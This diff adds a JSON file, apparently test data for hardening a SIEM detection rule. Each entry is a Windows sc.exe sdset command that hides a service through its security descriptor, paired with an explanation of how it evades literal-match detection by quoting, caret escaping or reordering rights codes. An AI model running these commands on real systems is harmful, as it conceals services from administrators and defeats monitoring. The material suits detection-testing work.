@@ -1,0 +1,14 @@
+[
+  {
+    "output": "sc.exe \"sdset\" AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"",
+    "explanation": "Insertion technique: Wrapping the 'sdset' verb parameter in double quotes modifies the raw CommandLine string format. While the Windows sc.exe utility strips internal quotes during command argument ingestion and safely updates the target descriptor, it effectively disrupts literal continuous string searches in SIEM engines expecting a contiguous 'sdset' sequence without quote boundaries."
+  },
+  {
+    "output": "cmd.exe /c sc.exe sdset AtomicService \"D:(D;;DCLCWPDT^SD;;;IU)(D;;DCLCWPDT^SD;;;SU)(D;;DCLCWPDT^SD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"",
+    "explanation": "Insertion technique: Passing the command string through cmd.exe enables the use of the shell caret (^) escape symbol inside the SDDL permissions string sequence ('DCLCWPDT^SD'). The command processor strips the caret prior to calling sc.exe, so the underlying service permissions logic handles the string identically. However, raw endpoint telemetry preserves the caret character, successfully evading the literal exact-match criterion for 'DCLCWPDTSD'."
+  },
+  {
+    "output": "sc.exe sdset AtomicService \"D:(D;;SDDTWPWPLCDC;;;IU)(D;;SDDTWPWPLCDC;;;SU)(D;;SDDTWPWPLCDC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"",
+    "explanation": "Other technique (SDDL Arbitrary Order Parsing): The Windows security descriptor parser evaluates permission bit short-codes independently of their relative order inside an Access Control Entry (ACE) string block. By reordering 'DCLCWPDTSD' to 'SDDTWPWPLCDC', the security subsystem applies the exact same hidden and unremovable service constraint definitions, but entirely avoids the strict substring lookup checking rules specified by 'selection_cli'."
+  }
+]
